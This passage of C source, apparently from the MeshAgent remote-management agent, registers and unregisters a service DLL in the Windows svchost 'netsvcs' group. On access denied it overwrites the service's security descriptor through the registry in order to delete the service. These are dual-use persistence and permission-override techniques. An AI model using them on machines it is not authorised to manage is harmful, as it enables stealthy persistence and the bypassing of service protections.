                           0, KEY_READ | KEY_WRITE, &hServiceHostKey);
    if (result == ERROR_SUCCESS)
    {
        WCHAR currentServices[4096] = {0};
        dwSize = sizeof(currentServices);
        dwType = REG_MULTI_SZ;

        result = RegQueryValueExW(hServiceHostKey, L"netsvcs", NULL, &dwType,
                                  (LPBYTE)currentServices, &dwSize);

        if (result == ERROR_FILE_NOT_FOUND)
        {
            currentServices[0] = L'\0';
            currentServices[1] = L'\0';
            dwSize = sizeof(wchar_t);
            result = ERROR_SUCCESS;
        }

        if (result == ERROR_SUCCESS)
        {
            WCHAR* ptr = currentServices;
            BOOL alreadyPresent = FALSE;

            while (*ptr != L'\0')
            {
                if (_wcsicmp(ptr, serviceName) == 0)
                {
                    alreadyPresent = TRUE;
                    break;
                }
                ptr += wcslen(ptr) + 1;
            }

            if (!alreadyPresent)
            {
                size_t usedChars = (size_t)(ptr - currentServices);
                size_t nameLen = wcslen(serviceName) + 1; // include null terminator
                size_t required = usedChars + nameLen + 1; // extra null for double-terminator

                if (required >= _countof(currentServices))
                {
                    ServiceUtil_DebugLastErrorW(L"RegSetValueEx(netsvcs)");
                    goto CLEANUP;
                }

                wcscpy_s(currentServices + usedChars, _countof(currentServices) - usedChars, serviceName);
                usedChars += nameLen;
                currentServices[usedChars] = L'\0';
                usedChars++;

                DWORD bytesToWrite = (DWORD)(usedChars * sizeof(wchar_t));
                if (RegSetValueExW(hServiceHostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)currentServices, bytesToWrite) != ERROR_SUCCESS)
                {
                    goto CLEANUP;
                }
            }

            netsvcsConfigured = TRUE;
        }

        RegCloseKey(hServiceHostKey);
        hServiceHostKey = NULL;
    }

    if (!netsvcsConfigured)
    {
        ServiceUtil_DebugPrintfA("Failed to ensure netsvcs membership for %ls", serviceName);
        goto CLEANUP;
    }

    if (hService != NULL && wDescription[0] != 0)
    {
        SERVICE_DESCRIPTIONW sd = {0};
        sd.lpDescription = wDescription;
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }

    success = TRUE;

CLEANUP:
    if (hServiceHostKey != NULL) { RegCloseKey(hServiceHostKey); }
    if (hParamsKey != NULL) { RegCloseKey(hParamsKey); }
    if (hKey != NULL) { RegCloseKey(hKey); }
    if (hService != NULL) { CloseServiceHandle(hService); }
    if (hSCM != NULL) { CloseServiceHandle(hSCM); }

    return success;
}

static BOOL ServiceHost_ResetServiceSecurityByRegistry(const wchar_t* targetName)
{
    if (targetName == NULL || targetName[0] == L'\0') { return FALSE; }
    wchar_t keyPath[512];
    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", targetName);

    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    PSECURITY_DESCRIPTOR sd = NULL;
    BOOL ok = FALSE;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(MESH_SERVICE_DACL_SDDL, SDDL_REVISION_1, &sd, NULL))
    {
        DWORD sdLen = GetSecurityDescriptorLength(sd);
        if (RegSetValueExW(hKey, L"Security", 0, REG_BINARY, (const BYTE*)sd, sdLen) == ERROR_SUCCESS)
        {
            ok = TRUE;
        }
        LocalFree(sd);
    }
    RegCloseKey(hKey);
    return ok;
}

BOOL ServiceHost_UnregisterServiceHostService(const wchar_t* serviceName)
{
    if (!serviceName || !*serviceName) { return FALSE; }

    BOOL success = TRUE;
    // Remove from svchost group (netsvcs)
    HKEY hServiceHostKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ServiceHost",
                      0, KEY_READ | KEY_WRITE, &hServiceHostKey) == ERROR_SUCCESS)
    {
        DWORD type = 0;
        DWORD cb = 0;
        if (RegQueryValueExW(hServiceHostKey, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
        {
            wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
            if (buf && RegQueryValueExW(hServiceHostKey, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
            {
                buf[cb / sizeof(wchar_t)] = L'\0';
                buf[cb / sizeof(wchar_t) + 1] = L'\0';
                // Build new list excluding serviceName
                size_t outLen = 0;
                wchar_t* out = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
                if (out)
                {
                    for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
                    {
                        if (_wcsicmp(p, serviceName) == 0) { continue; }
                        size_t len = wcslen(p) + 1;
                        wcscpy_s(out + outLen, (cb/sizeof(wchar_t)) - outLen, p);
                        outLen += len;
                    }
                    out[outLen] = L'\0';
                    RegSetValueExW(hServiceHostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)out, (DWORD)((outLen + 1) * sizeof(wchar_t)));
                    free(out);
                }
            }
            if (buf) free(buf);
        }
        RegCloseKey(hServiceHostKey);
    }

    // Remove service from SCM
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM != NULL)
    {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
        if (hService != NULL)
        {
            SERVICE_STATUS svcStatus = {0};
            ControlService(hService, SERVICE_CONTROL_STOP, &svcStatus);
            if (!DeleteService(hService))
            {
                success = FALSE;
                ServiceDeploy_LogInstallEvent(L"[WARN] DeleteService failed for %ls (error=%lu)", serviceName, GetLastError());
            }
            CloseServiceHandle(hService);
        }
        else
        {
            DWORD openErr = GetLastError();
            if (openErr == ERROR_ACCESS_DENIED)
            {
                if (ServiceHost_ResetServiceSecurityByRegistry(serviceName))
                {
                    ServiceDeploy_LogInstallEvent(L"Reset service security descriptor via registry for %ls", serviceName);
                    hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
                }
                else
                {
                    ServiceDeploy_LogInstallEvent(L"[WARN] Failed to reset service security descriptor via registry for %ls", serviceName);
                }
            }
            if (hService != NULL)
            {
                SERVICE_STATUS svcStatus = {0};
                ControlService(hService, SERVICE_CONTROL_STOP, &svcStatus);
                if (!DeleteService(hService))
                {
                    success = FALSE;
                    ServiceDeploy_LogInstallEvent(L"[WARN] DeleteService failed for %ls (error=%lu)", serviceName, GetLastError());
                }
                CloseServiceHandle(hService);
            }
            else if (openErr != ERROR_SERVICE_DOES_NOT_EXIST)
            {
                success = FALSE;
                ServiceDeploy_LogInstallEvent(L"[WARN] OpenService failed for %ls (error=%lu)", serviceName, openErr);
            }
        }
        CloseServiceHandle(hSCM);
    }
    else
    {
        success = FALSE;
    }

    // Delete service key tree
    wchar_t keyPath[512];
    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);
    LSTATUS del = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
    if (!(del == ERROR_SUCCESS || del == ERROR_FILE_NOT_FOUND || del == ERROR_PATH_NOT_FOUND))
    {
        success = FALSE;
    }

    return success;
}

/**
 * DLL Main entry point
 * Required for DLL version of MeshAgent
 */
#ifdef BUILD_SERVICE_BUNDLE_DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // DLL is being loaded
            // Disable thread notifications for performance
            ServiceHost_InitializePaths(hinstDLL);
            DisableThreadLibraryCalls(hinstDLL);
            break;

        case DLL_PROCESS_DETACH:
            // DLL is being unloaded
            if (g_ServiceHostAgent != NULL)
            {
                MeshAgent_Stop(g_ServiceHostAgent);
                g_ServiceHostAgent = NULL;
            }
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            // Not used due to DisableThreadLibraryCalls
            break;
    }

    return TRUE;
}
#endif // BUILD_SERVICE_BUNDLE_DLL
static BOOL ServiceHost_SelectServiceHostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand)
{
    UNREFERENCED_PARAMETER(dllPath);

    if (exePathOut == NULL || exePathOutLen == 0)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    exePathOut[0] = L'\0';
    if (useExpand != NULL) { *useExpand = FALSE; }

    if (!ServiceUtil_GetSystemServiceHostPathW(exePathOut, exePathOutLen))
    {
        ServiceUtil_DebugPrintfW(L"ServiceHost_SelectServiceHostImage failed to resolve system svchost.exe (error=%lu)", GetLastError());
        if (useExpand != NULL) { *useExpand = FALSE; }
        return FALSE;
    }
    ServiceUtil_DebugPrintfW(L"ServiceHost_SelectServiceHostImage resolved system svchost.exe: %ls", exePathOut);
    if (useExpand != NULL) { *useExpand = FALSE; }
    return TRUE;
}
